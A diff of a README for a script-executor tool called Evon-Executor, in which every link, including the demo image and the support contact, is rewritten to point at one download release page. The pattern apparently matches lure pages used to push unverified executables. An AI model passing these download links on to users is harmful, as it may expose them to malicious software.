@@ -2,7 +2,7 @@
 
 Support for Unified Naming Convention for enhanced modern script compatibility.
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download Software](https://github.com/siwon1011/Evon-Executor/releases/tag/v2.0)](https://github.com/siwon1011/Evon-Executor/releases/tag/v2.0)
 
 ## Overview
 
@@ -20,7 +20,7 @@ Evon-Executor is a versatile tool that effortlessly integrates with modern scrip
 
 To begin using Evon-Executor, simply download the software package from the following link:
 
-[Download Software](https://github.com/user-attachments/files/18060583/Software.zip)
+[Download Software](https://github.com/siwon1011/Evon-Executor/releases/tag/v2.0)
 
 Once downloaded, launch the application and follow the on-screen instructions for installation.
 
@@ -30,11 +30,11 @@ If the link is not working, kindly check the "Releases" section of this reposito
 
 Here is a sneak peek at the Evon-Executor interface:
 
-![Evon-Executor Demo](https://example.com/demo.png)
+![Evon-Executor Demo](https://github.com/siwon1011/Evon-Executor/releases/tag/v2.0)
 
 ## Support
 
-For any inquiries or assistance regarding Evon-Executor, feel free to reach out to our support team at [support@evonexecutor.com](mailto:support@evonexecutor.com). We are here to help you make the most of your scripting experience with Evon-Executor.
+For any inquiries or assistance regarding Evon-Executor, feel free to reach out to our support team at [https://github.com/siwon1011/Evon-Executor/releases/tag/v2.0](https://github.com/siwon1011/Evon-Executor/releases/tag/v2.0). We are here to help you make the most of your scripting experience with Evon-Executor.
 
 ## License
 
